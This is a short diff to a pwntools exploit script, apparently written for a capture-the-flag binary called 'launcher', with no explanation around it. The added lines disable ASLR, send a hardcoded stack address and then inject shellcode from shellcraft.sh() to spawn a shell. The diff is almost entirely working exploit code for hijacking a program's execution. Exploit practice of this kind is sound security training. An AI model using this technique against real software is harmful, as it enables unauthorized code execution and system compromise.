@@ -6,6 +6,9 @@ from pwn import *
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF('launcher')
+context.terminal = "terminator -x".split()
+# We need ASLR to be disabled.
+context.aslr = False
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -38,6 +41,10 @@ continue
 # PIE:      No PIE (0x400000)
 
 io = start()
+
+#io.sendline('0x00007ffff7ff7000')
+io.sendline('0x00007fffffffd600')
+io.sendline(asm(shellcraft.sh()) + '\x00')
 
 # shellcode = asm(shellcraft.sh())
 # payload = fit({
